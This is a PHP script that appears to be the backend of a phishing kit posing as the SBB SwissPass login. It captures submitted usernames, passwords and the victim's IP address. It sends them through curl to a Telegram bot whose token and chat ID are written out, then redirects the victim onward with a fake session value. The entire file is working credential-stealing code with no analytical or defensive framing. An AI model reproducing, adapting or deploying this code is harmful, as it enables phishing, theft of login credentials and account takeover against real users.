<?php
$user = $_POST['USERNAME'] ; 
$pass = $_POST['PASSWORD'] ; 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 

 
$subject = "SBB SWISS PASS | :   :) <3 : from: ".$ip;
$nome="SWISSPASS Login " ; 
	$from="frt@hurt.com" ; 
	$from_mail = $nome.'<'.$from.'>';
$headers .= 'From: ' . $from_mail . "\r\n";

$message  = "------------------+ 😈 SBB -INFOS 😈 +-----------------\r\n";
$message .= "EMAIL : ".$user."\r\n";
$message .= "PASS : ".$pass."\r\n";
$message .= "---------------+ Host Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ 😈 SWISSPASS 😈 +------------------\r\n";



 	$website="https://api.telegram.org/bot5576566323:AAF8mXo0jDvQylxyxmUZwA67wP_G-DqGCLo";
    $params=[
        'chat_id'=>'2142292088',
        'text'=>$message,
    ];
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch); 


   $x=md5(microtime());$xx=sha1(microtime());


echo "<script> window.top.location.href = '../upp/index.html?cmd=_sbb&session=".$x.$xx."';   </script>";

?>